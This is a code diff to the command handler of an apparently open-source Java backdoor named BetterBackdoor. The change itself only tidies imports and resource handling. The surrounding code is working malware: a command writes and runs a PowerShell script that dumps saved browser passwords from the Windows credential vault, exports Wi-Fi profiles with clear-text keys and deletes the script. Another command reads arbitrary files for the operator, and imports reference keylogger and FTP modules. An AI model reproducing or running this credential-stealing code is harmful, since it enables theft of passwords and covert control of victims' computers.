@@ -1,20 +1,23 @@
 package com.github.thatcherdev.betterbackdoor.backdoor;
 
-import java.util.Scanner;
-import java.awt.datatransfer.DataFlavor;
 import java.awt.Rectangle;
 import java.awt.Robot;
 import java.awt.Toolkit;
+import java.awt.datatransfer.DataFlavor;
 import java.io.File;
 import java.io.PrintWriter;
 import java.util.ArrayList;
 import java.util.Arrays;
+import java.util.Scanner;
+
 import javax.imageio.ImageIO;
+
+import org.apache.commons.io.FileUtils;
+
 import com.github.thatcherdev.betterbackdoor.backend.DuckyScripts;
 import com.github.thatcherdev.betterbackdoor.backend.FTP;
 import com.github.thatcherdev.betterbackdoor.backend.KeyLogger;
 import com.github.thatcherdev.betterbackdoor.backend.Utils;
-import org.apache.commons.io.FileUtils;
 
 public class HandleCommand {
 
@@ -67,7 +70,8 @@ public class HandleCommand {
 		else if (command.equals("expass"))
 			try {
 				File exfilBrowserCreds = new File("ExfilBrowserCreds.ps1");
-				PrintWriter out = new PrintWriter(exfilBrowserCreds);
+				try(PrintWriter out = new PrintWriter(exfilBrowserCreds)){
+				
 				out.println("$filename=$PSScriptRoot+\"\\gathered\\BrowserPasswords.txt\"\n"
 						+ "[void][Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime]\n"
 						+ "$creds = (New-Object Windows.Security.Credentials.PasswordVault).RetrieveAll()\n"
@@ -76,11 +80,12 @@ public class HandleCommand {
 						+ "echo \"Microsoft Edge and Internet Explorer passwords exfiltrated to '$filename' on vitim's computer\"\n"
 						+ "exit");
 				out.flush();
-				out.close();
+			
 				send += Utils.runPSScript(exfilBrowserCreds.getAbsolutePath()) + "\n";
 				send += Utils.runCommand(
 						"netsh wlan export profile key=clear folder=" + System.getProperty("user.dir") + "\\gathered");
 				FileUtils.forceDelete(exfilBrowserCreds);
+				}
 			} catch (Exception e) {
 				send = "An error occurred when trying to exfiltrate passwords";
 				if (e.getMessage() != null)
@@ -139,11 +144,9 @@ public class HandleCommand {
 					send += ":\n" + e.getMessage();
 			}
 		else if (command.startsWith("cat"))
-			try {
-				Scanner in = new Scanner(new File(command.substring(4)));
+			try (Scanner in = new Scanner(new File(command.substring(4)))) {
 				while (in.hasNextLine())
 					send += in.nextLine() + "\n";
-				in.close();
 			} catch (Exception e) {
 				send = "An error occurred when trying to get file";
 				if (e.getMessage() != null)
